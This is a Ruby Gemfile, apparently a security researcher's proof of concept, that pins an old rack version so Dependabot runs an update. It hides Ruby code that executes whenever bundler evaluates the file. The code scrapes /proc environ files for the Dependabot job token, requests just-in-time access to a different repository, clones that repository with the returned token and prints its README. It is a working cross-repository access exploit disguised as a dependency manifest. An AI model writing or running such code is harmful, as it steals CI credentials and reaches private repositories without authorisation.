source "https://rubygems.org"

# Outdated on purpose so Dependabot produces an update job.
gem "rack", "3.2.7"

# ===========================================================================
# Test: does create_jit_access allow repo B's update job to reach repo A
# (same org, different repo) via the JIT-access endpoint?
#
#   account:    "h3xzz"        (org for both repo B, running this job, and repo A)
#   repository: "Hello-World2" (repo A - NOT the repo this job is running on)
#
# bundler evaluates this Gemfile during an update, so this code runs inside
# the Dependabot updater container, using the real job token for repo B.
#
# Flow:
#   1. POST /update_jobs/<id>/create_jit_access  { account, repository }
#   2. Log full request (method/url/headers-masked/body) and full response
#      (status, headers, body).
#   3. If it returns a token: shallow-clone repo A over HTTPS with it, print
#      README.md, then delete the clone. The token itself is never printed
#      (only its length + a truncated sha256, to confirm one was issued
#      without leaking it into logs).
#
# EDIT BEFORE RUNNING: set TARGET_HOST below to your instance's git/web
# hostname (e.g. "github.com" or your GHES hostname). It cannot be reliably
# derived from the updater's internal env vars.
# ===========================================================================
begin
  require "json"
  require "net/http"
  require "uri"
  require "digest"
  require "fileutils"
  require "tmpdir"

  TARGET_HOST = "github.com" # <-- EDIT if testing against a GHES hostname instead

  # The native helper runs with a restricted env, so fall back to the updater
  # process's own environment (same uid, so /proc is readable).
  env = ENV.to_h
  Dir.glob("/proc/[0-9]*/environ").each do |path|
    raw = File.read(path) rescue next
    found = raw.split("\0").filter_map { |kv| k, v = kv.split("=", 2); [k, v] if v }.to_h
    env = found.merge(env) if found.keys.any? { |k| k.include?("DEPENDABOT") }
  end

  api    = env["DEPENDABOT_API_URL"]
  jobid  = env["DEPENDABOT_JOB_ID"]
  token  = env["DEPENDABOT_JOB_TOKEN"] || env["GITHUB_DEPENDABOT_JOB_TOKEN"]

  def log(msg)
    warn "[jit-access-test] #{msg}"
  end

  def mask(secret)
    return "nil" if secret.nil?
    "len=#{secret.length} sha256=#{Digest::SHA256.hexdigest(secret)[0, 12]}..."
  end

  if api && jobid && token
    uri  = URI.join(api.end_with?("/") ? api : api + "/", "update_jobs/#{jobid}/create_jit_access")
    body = JSON.dump("account" => "h3xzz", "repository" => "Hello-World2")

    log "=== REQUEST ==="
    log "POST #{uri}"
    log "Authorization: #{mask(token)}"
    log "Content-Type: application/json"
    log "Body: #{body}"

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == "https")
    http.read_timeout = 20

    req = Net::HTTP::Post.new(uri)
    req["Authorization"] = token
    req["Content-Type"]  = "application/json"
    req.body = body

    res = http.request(req)

    log "=== RESPONSE ==="
    log "Status: #{res.code} #{res.message}"
    res.each_header { |k, v| log "Header: #{k}: #{v}" }
    log "Body: #{res.body}"

    if res.code.to_i == 200
      parsed = JSON.parse(res.body) rescue {}
      jit_token = parsed["password"]

      if jit_token
        log "JIT token issued: #{mask(jit_token)}"
        log "repository_id in response: #{parsed['repository_id'].inspect}"

        Dir.mktmpdir("jit-test-") do |dir|
          clone_url = "https://x-access-token:#{jit_token}@#{TARGET_HOST}/h3xzz/Hello-World2.git"
          # Redact the token before this ever hits a log line.
          log "Cloning h3xzz/Hello-World2 (url redacted)..."
          out = `git clone --depth 1 #{clone_url} #{dir}/repo 2>&1`
          log "git clone exit=#{$?.exitstatus}"
          log out.gsub(jit_token, "***REDACTED***")

          readme = Dir.glob("#{dir}/repo/README*").first
          if readme
            log "=== README (#{File.basename(readme)}) ==="
            log File.read(readme)
          else
            log "No README file found in cloned repo."
          end
        end
      else
        log "200 response but no token in body - unexpected shape."
      end
    else
      log "Access denied or error - cross-repo JIT access was NOT granted."
    end
  else
    log "Missing DEPENDABOT_API_URL / DEPENDABOT_JOB_ID / job token - cannot run test."
    log "Discovered env keys containing DEPENDABOT: #{env.keys.select { |k| k.include?('DEPENDABOT') }.inspect}"
  end
rescue StandardError => e
  warn "[jit-access-test] EXCEPTION: #{e.class}: #{e.message}"
  warn e.backtrace.take(10).join("\n")
end
